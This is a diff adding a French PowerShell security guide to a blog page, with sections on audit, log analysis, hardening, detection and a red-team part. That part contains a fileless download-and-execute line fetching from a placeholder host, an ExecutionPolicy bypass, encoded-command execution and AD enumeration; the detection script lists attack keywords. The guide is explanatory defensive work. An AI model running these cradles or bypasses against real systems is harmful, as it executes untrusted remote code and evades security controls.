@@ -4,6 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<!-- ===== GOOGLE ANALYTICS ===== -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CRVR89FWBH"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-CRVR89FWBH');
+</script>
+
 <!-- ===== SEO ===== -->
 <title>PowerShell pour la sécurité : guide complet — Temgus.CyberBlog</title>
 <meta name="description" content="Commandes PowerShell essentielles pour l'audit, le durcissement et la détection Windows.">
@@ -12,7 +21,7 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://temgus2025.github.io/temgus-cyberblog/pages/powershell-securite.html">
 
-<!-- ===== OPEN GRAPH (Facebook, LinkedIn) ===== -->
+<!-- ===== OPEN GRAPH ===== -->
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://temgus2025.github.io/temgus-cyberblog/pages/powershell-securite.html">
 <meta property="og:title" content="PowerShell pour la sécurité : guide complet — Temgus.CyberBlog">
@@ -28,7 +37,6 @@
 
 <!-- ===== TWITTER CARD ===== -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:site" content="@temgus">
 <meta name="twitter:title" content="PowerShell pour la sécurité : guide complet — Temgus.CyberBlog">
 <meta name="twitter:description" content="Commandes PowerShell essentielles pour l'audit, le durcissement et la détection Windows.">
 <meta name="twitter:image" content="https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png">
@@ -41,22 +49,536 @@
   "headline": "PowerShell pour la sécurité : guide complet",
   "description": "Commandes PowerShell essentielles pour l'audit, le durcissement et la détection Windows.",
   "datePublished": "2025-05-01",
-  "author": {"@type": "Person", "name": "Temgus", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
-  "publisher": {"@type": "Person", "name": "Temgus"},
+  "author": {"@type": "Person", "name": "Derrick Temgoua", "url": "https://temgus2025.github.io/temgus-cyberblog/a-propos.html"},
+  "publisher": {"@type": "Person", "name": "Derrick Temgoua"},
   "url": "https://temgus2025.github.io/temgus-cyberblog/pages/powershell-securite.html",
   "inLanguage": "fr",
   "keywords": "PowerShell, Windows, sécurité, audit",
-  "timeRequired": "PT10M"
+  "timeRequired": "PT10M",
+  "image": "https://temgus2025.github.io/temgus-cyberblog/assets/og-image.png"
 }
 </script>
 
+<!-- ===== STYLES ===== -->
+<link rel="stylesheet" href="../css/style.css">
+<link rel="stylesheet" href="../css/article.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+
+<style>
+  /* Styles spécifiques aux pages statiques */
+  .static-article-layout {
+    max-width: 860px;
+    margin: 100px auto 60px;
+    padding: 0 24px;
+    font-family: 'Segoe UI', system-ui, sans-serif;
+    color: #c9d1d9;
+    line-height: 1.8;
+  }
+  .static-article-layout h1 {
+    color: #00d4ff;
+    font-size: 2rem;
+    margin-bottom: 12px;
+  }
+  .static-article-layout h2 {
+    color: #00d4ff;
+    font-size: 1.4rem;
+    margin-top: 40px;
+    border-left: 3px solid #00d4ff;
+    padding-left: 12px;
+  }
+  .static-article-layout h3 {
+    color: #7ee787;
+    font-size: 1.1rem;
+    margin-top: 24px;
+  }
+  .static-article-layout p { margin: 12px 0; }
+  .static-article-layout ul, .static-article-layout ol {
+    padding-left: 24px;
+    margin: 12px 0;
+  }
+  .static-article-layout li { margin: 6px 0; }
+  .static-article-layout pre {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    margin: 20px 0;
+  }
+  .static-article-layout code {
+    background: #161b22;
+    padding: 2px 6px;
+    border-radius: 4px;
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    color: #e6edf3;
+  }
+  .static-article-layout pre code {
+    background: none;
+    padding: 0;
+  }
+  .static-article-layout strong { color: #e6edf3; }
+  .static-article-layout a { color: #00d4ff; }
+
+  .article-meta-banner {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 12px;
+    padding: 20px 24px;
+    margin-bottom: 32px;
+    display: flex;
+    gap: 20px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+  .article-meta-banner .icon { font-size: 40px; }
+  .meta-info { flex: 1; }
+  .meta-category {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .meta-details {
+    color: #8892a4;
+    font-size: 13px;
+    margin-top: 8px;
+  }
+  .meta-details span { margin-right: 16px; }
+
+  .article-nav-links {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 60px;
+    padding-top: 24px;
+    border-top: 1px solid #21262d;
+    gap: 12px;
+    flex-wrap: wrap;
+  }
+  .article-nav-links a {
+    color: #00d4ff;
+    text-decoration: none;
+    font-size: 14px;
+    max-width: 45%;
+  }
+  .article-nav-links a:hover { text-decoration: underline; }
+
+  .toc-box {
+    background: #0d1117;
+    border: 1px solid #21262d;
+    border-radius: 8px;
+    padding: 16px 20px;
+    margin-bottom: 32px;
+  }
+  .toc-box h4 {
+    color: #00d4ff;
+    font-size: 12px;
+    letter-spacing: 2px;
+    margin: 0 0 12px;
+  }
+  .toc-list { list-style: none; padding: 0; margin: 0; }
+  .toc-list li { margin: 6px 0; }
+  .toc-list a { color: #8892a4; font-size: 14px; text-decoration: none; }
+  .toc-list a:hover { color: #00d4ff; }
+
+  .btn-read-original {
+    display: inline-block;
+    margin-top: 32px;
+    background: transparent;
+    border: 1px solid #00d4ff;
+    color: #00d4ff;
+    padding: 10px 20px;
+    border-radius: 8px;
+    text-decoration: none;
+    font-size: 14px;
+    transition: all 0.2s;
+  }
+  .btn-read-original:hover {
+    background: #00d4ff;
+    color: #060d1a;
+  }
+</style>
 </head>
-<body style="background:#060d1a;color:#fff;font-family:monospace;display:flex;align-items:center;justify-content:center;min-height:100vh;flex-direction:column;gap:20px;text-align:center;padding:40px">
-  <div style="font-size:48px">⚡</div>
-  <h1 style="color:#00d4ff;font-size:22px;max-width:600px">PowerShell pour la sécurité : guide complet</h1>
-  <p style="color:#8892a4;max-width:500px">Commandes PowerShell essentielles pour l'audit, le durcissement et la détection Windows.</p>
-  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#powershell-securite" style="background:#00d4ff;color:#060d1a;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:700">
-    Lire l'article →
+<body style="background:#060d1a">
+
+<canvas id="binary-canvas"></canvas>
+
+<!-- NAVBAR -->
+<nav id="navbar">
+  <a href="../index.html" class="logo">Temgus.<span>CyberBlog</span></a>
+  <ul class="nav-links">
+    <li><a href="../index.html">Accueil</a></li>
+    <li><a href="../index.html#articles" class="active">Articles</a></li>
+    <li><a href="../index.html#categories">Catégories</a></li>
+    <li><a href="../a-propos.html">À propos</a></li>
+  </ul>
+  <a href="../index.html" class="btn-outline" style="font-size:13px;padding:7px 16px">← Retour</a>
+</nav>
+
+<!-- ARTICLE COMPLET -->
+<main class="static-article-layout">
+
+  <!-- Bannière méta -->
+  <div class="article-meta-banner">
+    <div class="icon">⚡</div>
+    <div class="meta-info">
+      <div class="meta-category">Pentest</div>
+      <div style="color:#e6edf3;font-size:18px;font-weight:600">PowerShell pour la sécurité : guide complet</div>
+      <div class="meta-details">
+        <span>📅 2025-05-01</span>
+        <span>⏱ 10 min de lecture</span>
+        <span>🏷 Intermédiaire</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Table des matières -->
+  <div class="toc-box"><h4>// SOMMAIRE</h4><ul class="toc-list"><li><a href="#pourquoi-powershell-est-crucial-en-s-curit-">Pourquoi PowerShell est crucial en sécurité</a></li>
+<li><a href="#les-bases-de-powershell">Les bases de PowerShell</a></li>
+<li><a href="#commandes-essentielles-pour-la-s-curit-">Commandes essentielles pour la sécurité</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#reconnaissance-syst-me">Reconnaissance système</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#r-seau-et-connexions">Réseau et connexions</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#analyse-des-logs-windows">Analyse des logs Windows</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#audit-du-registre">Audit du registre</a></li>
+<li><a href="#powershell-pour-le-durcissement-hardening-">PowerShell pour le durcissement (Hardening)</a></li>
+<li><a href="#powershell-offensif-red-team-">PowerShell offensif (Red Team)</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#techniques-fileless">Techniques fileless</a></li>
+<li style="padding-left:16px;font-size:13px"><a href="#reconnaissance-active-directory">Reconnaissance Active Directory</a></li>
+<li><a href="#d-tection-des-attaques-powershell">Détection des attaques PowerShell</a></li>
+<li><a href="#amsi-antimalware-scan-interface">AMSI — Antimalware Scan Interface</a></li>
+<li><a href="#conclusion">Conclusion</a></li></ul></div>
+
+  <!-- Contenu de l'article -->
+  <article><h1>PowerShell pour la sécurité : guide complet</h1>
+
+<p>PowerShell est bien plus qu'un simple terminal Windows. C'est un outil puissant utilisé aussi bien par les administrateurs systèmes que par les pentesters et les attaquants. Maîtriser PowerShell est indispensable en cybersécurité Windows.</p>
+
+<h2 id="pourquoi-powershell-est-crucial-en-s-curit-">Pourquoi PowerShell est crucial en sécurité</h2>
+
+<pre><code>PowerShell est :
+<p>✅ Installé par défaut sur tous les Windows modernes</p>
+<p>✅ Accès natif au .NET Framework et aux APIs Windows</p>
+<p>✅ Capable de tout : réseau, fichiers, registre, AD, WMI</p>
+<p>✅ Souvent whitelisté par les antivirus (binaire Microsoft signé)</p>
+<p>✅ Utilisé massivement dans les attaques fileless (sans fichier)</p>
+
+<p>C'est pourquoi les attaquants l'adorent ET pourquoi</p>
+<p>les défenseurs doivent le maîtriser.</code></pre>
+
+<h2 id="les-bases-de-powershell">Les bases de PowerShell</h2>
+
+<pre><code class="language-powershell"># Cmdlets de base (Verbe-Nom)
+<p>Get-Help Get-Process           # Aide sur une commande</p>
+<p>Get-Command <em>network</em>          # Chercher des commandes</p>
+<p>Get-Alias ls                   # Voir les alias</p>
+
+<h1>Variables et types</h1>
+<p>$nom = "Temgus"</p>
+<p>$age = 25</p>
+<p>$tableau = @(1, 2, 3, 4, 5)</p>
+<p>$hashtable = @{cle = "valeur"; autre = 42}</p>
+
+<h1>Conditions et boucles</h1>
+<p>if ($age -gt 18) { Write-Host "Majeur" }</p>
+<p>foreach ($item in $tableau) { Write-Host $item }</p>
+<p>1..10 | ForEach-Object { Write-Host $_ }</p>
+
+<h1>Pipeline (chaîner les commandes)</h1>
+<p>Get-Process | Where-Object {$_.CPU -gt 10} | Sort-Object CPU -Descending | Select-Object -First 5</code></pre>
+
+<h2 id="commandes-essentielles-pour-la-s-curit-">Commandes essentielles pour la sécurité</h2>
+
+<h3 id="reconnaissance-syst-me">Reconnaissance système</h3>
+
+<pre><code class="language-powershell"># Informations système complètes
+<p>Get-ComputerInfo</p>
+<p>systeminfo</p>
+
+<h1>Utilisateurs et groupes</h1>
+<p>Get-LocalUser</p>
+<p>Get-LocalGroup</p>
+<p>Get-LocalGroupMember -Group "Administrateurs"</p>
+<p>net user                          # Tous les utilisateurs</p>
+<p>net localgroup Administrators     # Membres du groupe admin</p>
+
+<h1>Processus en cours</h1>
+<p>Get-Process | Sort-Object CPU -Descending</p>
+<p>Get-Process | Select-Object Name, Id, CPU, Path</p>
+<p>Get-WmiObject Win32_Process | Select-Object Name, ProcessId, CommandLine</p>
+
+<h1>Services</h1>
+<p>Get-Service | Where-Object {$_.Status -eq "Running"}</p>
+<p>Get-Service | Where-Object {$_.StartType -eq "Automatic"}</p>
+
+<h1>Tâches planifiées (souvent utilisées pour la persistence)</h1>
+<p>Get-ScheduledTask | Where-Object {$_.State -eq "Ready"}</p>
+<p>Get-ScheduledTask | Select-Object TaskName, TaskPath, State</code></pre>
+
+<h3 id="r-seau-et-connexions">Réseau et connexions</h3>
+
+<pre><code class="language-powershell"># Connexions réseau actives
+<p>Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}</p>
+<p>Get-NetTCPConnection | Sort-Object State | Format-Table</p>
+
+<h1>Ports en écoute</h1>
+<p>Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess</p>
+
+<h1>Connecter PID aux processus</h1>
+<p>Get-NetTCPConnection -State Established | ForEach-Object {</p>
+<p>$proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue</p>
+<p>[PSCustomObject]@{</p>
+<p>LocalAddress  = $_.LocalAddress</p>
+<p>LocalPort     = $_.LocalPort</p>
+<p>RemoteAddress = $_.RemoteAddress</p>
+<p>RemotePort    = $_.RemotePort</p>
+<p>State         = $_.State</p>
+<p>ProcessName   = $proc.Name</p>
+<p>PID           = $_.OwningProcess</p>
+<p>}</p>
+<p>}</p>
+
+<h1>Interfaces réseau</h1>
+<p>Get-NetAdapter</p>
+<p>Get-NetIPAddress</p>
+<p>Get-NetRoute</p>
+
+<h1>DNS</h1>
+<p>Resolve-DnsName google.com</p>
+<p>Resolve-DnsName -Type MX gmail.com</code></pre>
+
+<h3 id="analyse-des-logs-windows">Analyse des logs Windows</h3>
+
+<pre><code class="language-powershell"># Logs de sécurité - Connexions réussies
+<p>Get-EventLog -LogName Security -InstanceId 4624 -Newest 20 |</p>
+<p>Select-Object TimeGenerated, Message</p>
+
+<h1>Tentatives de connexion échouées</h1>
+<p>Get-EventLog -LogName Security -InstanceId 4625 -Newest 50 |</p>
+<p>Select-Object TimeGenerated, @{N='IP';E={$_.ReplacementStrings[19]}}</p>
+
+<h1>PowerShell moderne avec Get-WinEvent</h1>
+<p>Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} -MaxEvents 100 |</p>
+<p>Select-Object TimeCreated, Message</p>
+
+<h1>Créations de comptes (Event 4720)</h1>
+<p>Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720}</p>
+
+<h1>Modifications de groupes privilégiés (Event 4728)</h1>
+<p>Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4728}</p>
+
+<h1>Logs PowerShell (activité des scripts)</h1>
+<p>Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50</p>
+
+<h1>Exporter les logs</h1>
+<p>Get-EventLog -LogName Security -Newest 1000 |</p>
+<p>Export-Csv "C:\logs\security_events.csv" -NoTypeInformation</code></pre>
+
+<h3 id="audit-du-registre">Audit du registre</h3>
+
+<pre><code class="language-powershell"># Clés de démarrage automatique (persistence)
+<p>Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</p>
+<p>Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</p>
+<p>Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"</p>
+
+<h1>Programmes installés</h1>
+<p>Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" |</p>
+<p>Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |</p>
+<p>Sort-Object DisplayName</p>
+
+<h1>Politiques PowerShell</h1>
+<p>Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"</code></pre>
+
+<h2 id="powershell-pour-le-durcissement-hardening-">PowerShell pour le durcissement (Hardening)</h2>
+
+<pre><code class="language-powershell"># Configurer l'ExecutionPolicy
+<p>Set-ExecutionPolicy AllSigned -Scope LocalMachine</p>
+<h1>AllSigned : seuls les scripts signés peuvent s'exécuter</h1>
+
+<h1>Activer la journalisation PowerShell</h1>
+<p>$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"</p>
+<p>New-Item -Path $regPath -Force</p>
+<p>New-ItemProperty -Path "$regPath\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1</p>
+<p>New-ItemProperty -Path "$regPath\Transcription" -Name "EnableTranscripting" -Value 1</p>
+<p>New-ItemProperty -Path "$regPath\Transcription" -Name "OutputDirectory" -Value "C:\PSLogs"</p>
+
+<h1>Activer Windows Defender</h1>
+<p>Set-MpPreference -DisableRealtimeMonitoring $false</p>
+<p>Set-MpPreference -SubmitSamplesConsent 2</p>
+<p>Update-MpSignature</p>
+
+<h1>Désactiver les protocoles obsolètes</h1>
+<p>Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol"</p>
+<p>Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force</p>
+
+<h1>Pare-feu Windows</h1>
+<p>New-NetFirewallRule -DisplayName "Bloquer Telnet" -Direction Inbound <code></p>
+<p>-Protocol TCP -LocalPort 23 -Action Block</p>
+<p>Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} |</p>
+<p>Select-Object DisplayName, Direction, Action</code></pre>
+
+<h2 id="powershell-offensif-red-team-">PowerShell offensif (Red Team)</h2>
+
+<h3 id="techniques-fileless">Techniques fileless</h3>
+
+<pre><code class="language-powershell"># Download en mémoire (sans écriture disque)
+<p>$code = (New-Object System.Net.WebClient).DownloadString('http://exemple.com/script.ps1')</p>
+<p>Invoke-Expression $code</p>
+
+<h1>Exécution depuis Base64 (technique d'obfuscation courante)</h1>
+<p>$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'Hello'"))</p>
+<p>powershell.exe -EncodedCommand $encoded</p>
+
+<h1>Bypass ExecutionPolicy (sans modifier la politique)</h1>
+<p>powershell.exe -ExecutionPolicy Bypass -File script.ps1</p>
+<p>Get-Content script.ps1 | Invoke-Expression</code></pre>
+
+<h3 id="reconnaissance-active-directory">Reconnaissance Active Directory</h3>
+
+<pre><code class="language-powershell"># Sans outils supplémentaires (LDAP natif)
+<p>$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</p>
+<p>$domain.DomainControllers</p>
+
+<h1>Recherche d'utilisateurs AD</h1>
+<p>([adsisearcher]"(&amp;(objectClass=user)(objectCategory=person))").FindAll() |</p>
+<p>ForEach-Object { $_.Properties.samaccountname }</p>
+
+<h1>Groupes privilégiés</h1>
+<p>([adsisearcher]"(&amp;(objectClass=group)(cn=Domain Admins))").FindOne().Properties.member</p>
+
+<h1>Avec le module ActiveDirectory (si disponible)</h1>
+<p>Import-Module ActiveDirectory</p>
+<p>Get-ADUser -Filter * -Properties LastLogonDate | Sort-Object LastLogonDate</p>
+<p>Get-ADGroupMember "Domain Admins"</p>
+<p>Get-ADComputer -Filter * | Select-Object Name, OperatingSystem</code></pre>
+
+<h2 id="d-tection-des-attaques-powershell">Détection des attaques PowerShell</h2>
+
+<pre><code class="language-powershell"># Script de détection d'activité suspecte
+<p>function Detect-SuspiciousPowerShell {</p>
+<p>$events = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" </code></p>
+<p>-FilterXPath "*[System[EventID=4104]]" -MaxEvents 500</p>
+
+<p>$suspicious = @(</p>
+<p>'IEX', 'Invoke-Expression',</p>
+<p>'DownloadString', 'WebClient',</p>
+<p>'EncodedCommand', 'FromBase64String',</p>
+<p>'Bypass', 'Hidden',</p>
+<p>'mimikatz', 'empire', 'cobalt'</p>
+<p>)</p>
+
+<p>foreach ($event in $events) {</p>
+<p>foreach ($pattern in $suspicious) {</p>
+<p>if ($event.Message -match $pattern) {</p>
+<p>Write-Warning "SUSPECT: $pattern trouvé dans un script PowerShell"</p>
+<p>Write-Host "Heure: $($event.TimeCreated)"</p>
+<p>Write-Host "Message: $($event.Message.Substring(0, [Math]::Min(200, $event.Message.Length)))"</p>
+<p>Write-Host "---"</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+<p>}</p>
+
+<p>Detect-SuspiciousPowerShell</code></pre>
+
+<h2 id="amsi-antimalware-scan-interface">AMSI — Antimalware Scan Interface</h2>
+
+<p>Windows 10+ intègre AMSI qui scanne le contenu PowerShell avant exécution.</p>
+
+<pre><code class="language-powershell"># AMSI intercepte et scanne :
+<h1>→ Tous les scripts PowerShell</h1>
+<h1>→ Le contenu des chaînes passées à Invoke-Expression</h1>
+<h1>→ Les scripts VBScript et JScript</h1>
+<h1>→ Les macros Office</h1>
+
+<h1>Tester AMSI</h1>
+<p>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')</p>
+<h1>Si AMSI est actif, cette commande sera bloquée ou alertée</h1>
+
+<h1>Defender + AMSI = double protection</h1>
+<h1>Les pentesters cherchent des bypasses → Les défenseurs surveillent ces tentatives</code></pre></h1>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>PowerShell est indispensable en cybersécurité Windows, des deux côtés. Pour les défenseurs : activez la journalisation ScriptBlock, surveillez les EventID 4103/4104, et formez vos équipes à reconnaître les usages suspects. Pour les pentesters : PowerShell est votre meilleur allié pour la reconnaissance et la post-exploitation sur les environnements Windows.</p></article>
+
+  <!-- Lien vers la version interactive -->
+  <a href="https://temgus2025.github.io/temgus-cyberblog/article.html#powershell-securite" class="btn-read-original">
+    💬 Voir l'article avec commentaires →
   </a>
+
+  <!-- Navigation précédent / suivant -->
+  <div class="article-nav-links">
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/dark-web.html" class="nav-prev">← Dark Web : mythes et réalités</a>
+    <a href="https://temgus2025.github.io/temgus-cyberblog/pages/threat-hunting.html" class="nav-next">Threat Hunting : la chasse proactive aux menaces →</a>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-inner">
+    <div>
+      <div class="footer-logo">Temgus.<span>CyberBlog</span></div>
+      <div class="footer-copy">© 2025 Temgus — Tous droits réservés</div>
+    </div>
+    <div class="footer-links">
+      <a href="../mentions-legales.html">Mentions légales</a>
+      <a href="../a-propos.html">Contact</a>
+      <a href="https://github.com/temgus2025" target="_blank">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+<!-- Coloration syntaxique -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>
+  // Highlight.js
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('pre code').forEach(el => hljs.highlightElement(el));
+  });
+
+  // Animation binaire (depuis style.css / app.js existant)
+  const canvas = document.getElementById('binary-canvas');
+  if (canvas) {
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    const cols = Math.floor(canvas.width / 14);
+    const drops = Array(cols).fill(1);
+    function drawBinary() {
+      ctx.fillStyle = 'rgba(6,13,26,0.05)';
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(0,212,255,0.15)';
+      ctx.font = '12px monospace';
+      drops.forEach((y, i) => {
+        ctx.fillText(Math.random() > 0.5 ? '1' : '0', i * 14, y * 14);
+        if (y * 14 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      });
+    }
+    setInterval(drawBinary, 50);
+    window.addEventListener('resize', () => {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    });
+  }
+
+  // Navbar scroll
+  window.addEventListener('scroll', () => {
+    const nav = document.getElementById('navbar');
+    if (nav) nav.classList.toggle('scrolled', window.scrollY > 50);
+  });
+
+  // Smooth scroll pour le sommaire
+  document.querySelectorAll('.toc-list a').forEach(a => {
+    a.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(a.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+    });
+  });
+</script>
+
 </body>
 </html>
